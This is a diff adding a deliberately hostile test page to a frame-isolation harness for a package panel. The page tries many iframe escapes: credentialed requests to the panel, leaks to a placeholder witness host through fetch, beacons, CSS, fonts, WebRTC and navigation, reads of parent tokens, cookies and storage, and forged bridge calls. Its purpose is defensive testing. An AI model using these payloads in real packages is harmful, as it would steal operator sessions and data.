@@ -1,0 +1,167 @@
+<!doctype html>
+<html>
+<head>
+<!--
+  frame_isolation_hostile.html - the hostile package page of the frame-isolation harness
+  Copyright 2026 514 LLC d/b/a OpenGlow
+  Written by Scott Wiederhold
+  SPDX-License-Identifier: MIT
+
+  Every escape a package's page could try, each request tagged, so that
+  the witness servers' log says what left the browser. frame_isolation.py
+  fills the placeholders and serves it as a package's page; it is never
+  shipped in a package.
+-->
+<title>hostile package page</title>
+<style id="s">body{font:12px sans-serif;margin:4px;color:#555}</style>
+</head>
+<body>
+hostile page: __MECH__ / __VARIANT__
+<script>
+"use strict";
+var MECH = "__MECH__", VARIANT = "__VARIANT__", OTHER = "__OTHER__", PANEL = "__PANEL__";
+var STUN = "__STUNHOST__:__STUNPORT__", PRECONNECT = "__OTHERHOST__:__TCPPORT__";
+function tag(name) { return "t=" + MECH + "-" + name; }
+function other(name) { return OTHER + "/x?" + tag(name) + "&leak=bed-image-bytes"; }
+var seen = {};
+function note(name, outcome) { seen[name] = String(outcome); }
+function attempt(name, fn) {
+  try {
+    var r = fn();
+    if (r && r.then) r.then(function (v) { note(name, "ran: " + v); }, function (e) { note(name, "rejected: " + e); });
+    else note(name, "ran: " + r);
+  } catch (e) { note(name, "threw: " + e); }
+}
+function el(tagName, attrs) {
+  var e = document.createElement(tagName);
+  for (var k in attrs) e.setAttribute(k, attrs[k]);
+  document.body.appendChild(e);
+  return e;
+}
+function done(ms) {
+  setTimeout(function () {
+    try { parent.postMessage({ harness: 1, mech: MECH, variant: VARIANT, seen: seen }, "*"); } catch (e) {}
+  }, ms);
+}
+
+/* The bridge, as a package's page uses it: a call and its reply. */
+var bridgeN = 0, bridgeWaiting = {};
+window.addEventListener("message", function (ev) {
+  var m = ev.data;
+  if (m && m.forgefirm === 1 && bridgeWaiting[m.id]) { bridgeWaiting[m.id](m); delete bridgeWaiting[m.id]; }
+});
+function ask(name, call, args, extra) {
+  var id = ++bridgeN, msg = { forgefirm: 1, id: id, call: call, args: args };
+  for (var k in (extra || {})) msg[k] = extra[k];
+  var t = setTimeout(function () { if (bridgeWaiting[id]) { delete bridgeWaiting[id]; note(name, "no reply"); } }, 1500);
+  bridgeWaiting[id] = function (m) {
+    clearTimeout(t);
+    note(name, m.ok ? "ok: " + JSON.stringify(m.value).slice(0, 120) : "refused: " + m.error);
+  };
+  try { parent.postMessage(msg, "*"); } catch (e) { note(name, "threw: " + e); }
+}
+
+function battery() {
+  // 1. the panel's own routes, with the operator's session
+  attempt("fetch-panel", function () {
+    return fetch(PANEL + "/settings?" + tag("fetch-panel"), { credentials: "include" }).then(function (r) { return r.status; });
+  });
+  attempt("xhr-panel", function () {
+    var x = new XMLHttpRequest(); x.withCredentials = true;
+    x.open("GET", PANEL + "/settings?" + tag("xhr-panel")); x.send(); return "sent";
+  });
+  attempt("img-panel", function () { el("img", { src: PANEL + "/cam/snapshot?cam=lid&" + tag("img-panel") }); return "added"; });
+
+  // 2. the network, from the operator's browser
+  attempt("fetch-other", function () { return fetch(other("fetch-other"), { mode: "no-cors" }).then(function () { return "resolved"; }); });
+  attempt("xhr-other", function () { var x = new XMLHttpRequest(); x.open("GET", other("xhr-other")); x.send(); return "sent"; });
+  attempt("beacon-other", function () { return navigator.sendBeacon(other("beacon-other"), "leak"); });
+  attempt("ws-other", function () { new WebSocket(OTHER.replace("http", "ws") + "/x?" + tag("ws-other")); return "constructed"; });
+  attempt("eventsource-other", function () { new EventSource(other("eventsource-other")); return "constructed"; });
+  attempt("img-other", function () { el("img", { src: other("img-other") }); return "added"; });
+  attempt("imgset-other", function () { el("img", { srcset: other("imgset-other") + " 1x" }); return "added"; });
+  attempt("script-other", function () { el("script", { src: other("script-other") }); return "added"; });
+  attempt("css-link-other", function () { el("link", { rel: "stylesheet", href: other("css-link-other") }); return "added"; });
+  attempt("css-bg-other", function () {
+    document.getElementById("s").textContent += "body{background:url('" + other("css-bg-other") + "')}"; return "added";
+  });
+  attempt("css-import-other", function () {
+    var st = document.createElement("style"); st.textContent = "@import url('" + other("css-import-other") + "');";
+    document.head.appendChild(st); return "added";
+  });
+  attempt("font-other", function () {
+    var st = document.createElement("style");
+    st.textContent = "@font-face{font-family:x;src:url('" + other("font-other") + "')} body{font-family:x}";
+    document.head.appendChild(st); return "added";
+  });
+  attempt("prefetch-other", function () { el("link", { rel: "prefetch", href: other("prefetch-other") }); return "added"; });
+  attempt("preload-other", function () { el("link", { rel: "preload", as: "image", href: other("preload-other") }); return "added"; });
+  attempt("iframe-other", function () { el("iframe", { src: other("iframe-other") }); return "added"; });
+  attempt("object-other", function () { el("object", { data: other("object-other") }); return "added"; });
+  attempt("embed-other", function () { el("embed", { src: other("embed-other") }); return "added"; });
+  attempt("video-other", function () { el("video", { src: other("video-other"), autoplay: "" }); return "added"; });
+  attempt("audio-other", function () { el("audio", { src: other("audio-other"), autoplay: "" }); return "added"; });
+  attempt("worker-other", function () { new Worker(other("worker-other")); return "constructed"; });
+  // The two residuals the operator accepted (they are recorded, not asserted):
+  // WebRTC, and a connection hint, which opens a socket and sends nothing.
+  attempt("webrtc-stun", function () {
+    var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:" + STUN }] });
+    pc.createDataChannel("x");
+    return pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).then(function () { return "gathering"; });
+  });
+  attempt("preconnect-other", function () { el("link", { rel: "preconnect", href: "http://" + PRECONNECT }); return "added"; });
+
+  // 3. the panel's secrets
+  attempt("read-parent-token", function () { return parent.PANEL_TOKEN || parent.TOKEN; });
+  attempt("read-parent-document", function () { return parent.document.title; });
+  attempt("read-parent-frames", function () { return JSON.stringify(parent.EXT_FRAMES); });
+  attempt("read-top-location", function () { return top.location.href; });
+  attempt("read-cookie", function () { return document.cookie || "(empty)"; });
+  attempt("read-localstorage", function () { return localStorage.length; });
+  attempt("read-parent-localstorage", function () { return parent.localStorage.length; });
+
+  // 4. drawing over the panel
+  attempt("fullscreen", function () {
+    return document.documentElement.requestFullscreen().then(function () { return "ENTERED"; });
+  });
+  attempt("alert", function () { alert("hostile"); return "returned"; });
+  attempt("pointer-lock", function () { document.body.requestPointerLock(); return "requested"; });
+
+  // 5. the bridge: what it gives, and what it must refuse
+  ask("bridge-self", "self");
+  ask("bridge-granted", "machine.mode");
+  ask("bridge-ungranted", "motion.jog", { x: 1 });
+  ask("bridge-other-camera", "camera.frame", { camera: "head" });
+  ask("bridge-nosuch", "cnc.latch", { unlock: 1 });
+  // A claim about who is asking, and about what it may do, is no input.
+  ask("bridge-claim", "motion.jog", { x: 1 }, { from: "org.example.panel", capabilities: ["motion.jog"] });
+
+  done(2500);
+}
+
+// Navigation vectors, one per frame: a blocked navigation can still replace
+// the document, so each gets a document of its own.
+var NAV = {
+  "nav-location": function () { location.href = other("nav-location"); },
+  "nav-assign-panel": function () { location.href = PANEL + "/?" + tag("nav-assign-panel"); },
+  "nav-form": function () {
+    var f = el("form", { action: other("nav-form"), method: "GET" });
+    var i = el("input", { name: "t", value: MECH + "-nav-form" }); f.appendChild(i); f.submit();
+  },
+  "nav-meta": function () {
+    var m = document.createElement("meta"); m.httpEquiv = "refresh";
+    m.content = "0;url=" + other("nav-meta"); document.head.appendChild(m);
+  },
+  "nav-link": function () { el("a", { href: other("nav-link"), id: "l" }).click(); },
+  "nav-popup": function () { var w = window.open(other("nav-popup")); return w ? "OPENED" : "null"; },
+  "nav-top": function () { top.location.href = other("nav-top"); }
+};
+
+if (VARIANT === "main") battery();
+else {
+  attempt(VARIANT, NAV[VARIANT]);
+  done(1000);
+}
+</script>
+</body>
+</html>
